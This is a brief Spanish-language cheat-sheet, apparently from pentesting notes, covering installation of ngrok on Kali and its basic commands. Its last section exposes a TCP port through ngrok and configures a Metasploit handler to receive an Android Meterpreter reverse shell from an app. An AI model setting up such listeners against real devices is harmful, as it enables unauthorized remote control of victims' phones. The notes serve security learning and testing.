# Ngrok

Tags: #Ngrok

* [Ngrok-Windows](https://download.ngrok.com/windows) es un servicio que nos permite crear nuestro servidor local en un subdominio para poder visualizarlo fuera de la LAN, a través de Internet.

## Instalación Kali

```bash 
❯ wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz                                                

❯ tar xvzf ngrok-v3-stable-linux-amd64.tgz 
ngrok

❯ ./ngrok config add-authtoken PEGA_AQUI_TU_TOKEN
Authtoken saved to configuration file: /root/.config/ngrok/ngrok.yml
```

## Comandos 

```bash 
❯ ngrok help                   # Panel de ayuda 
❯ ngrok http 80                # Se pulica una web de local a publica
```

```bash 
# Usar Ngrok para recibir una 'ReverShell' desde una app

❯ ngrok tcp 4646               # Para abrir y recibir una conexion TCP (Te muestra el dominio publico y su puerto) que a su vez le esta haciendo un 'PortForwarding' a el puerto local '4646' de nuestra maquina


❯ msfconsole                   # Metasploit para recibir la conexion local en el puerto 4646
	❯ use exploit/multi/handler
	❯ set payload android/meterpreter/reverse_tcp 
	❯ set LHOST 0.0.0.0
	❯ set LPORT 4646
	❯ exploit
```